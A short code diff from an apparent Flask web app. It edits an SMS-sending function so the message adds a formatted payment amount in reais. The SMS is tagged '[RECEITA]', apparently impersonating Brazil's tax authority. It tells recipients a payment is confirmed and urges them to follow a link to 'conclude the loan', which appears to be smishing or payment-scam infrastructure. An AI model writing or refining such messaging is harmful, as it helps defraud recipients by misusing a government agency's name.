@@ -582,8 +582,17 @@ def send_payment_confirmation_sms():
         url_params = request.args.copy()
         url_params_str = "&".join([f"{k}={v}" for k, v in url_params.items()])
         
+        # Format the amount for display if present
+        formatted_amount = ''
+        if amount:
+            try:
+                amount_float = float(amount)
+                formatted_amount = f"R$ {amount_float:.2f}".replace('.', ',')
+            except ValueError:
+                formatted_amount = amount
+                
         # Construct the SMS message
-        message = f"[RECEITA] Para concluir o emprestimo acesse: {dominio}/obrigado?{url_params_str}"
+        message = f"[RECEITA] Seu pagamento de {formatted_amount} foi confirmado. Para concluir o emprestimo acesse: {dominio}/obrigado?{url_params_str}"
         
         app.logger.info(f"[PROD] Enviando SMS de confirmação para {phone}: {message}")
         
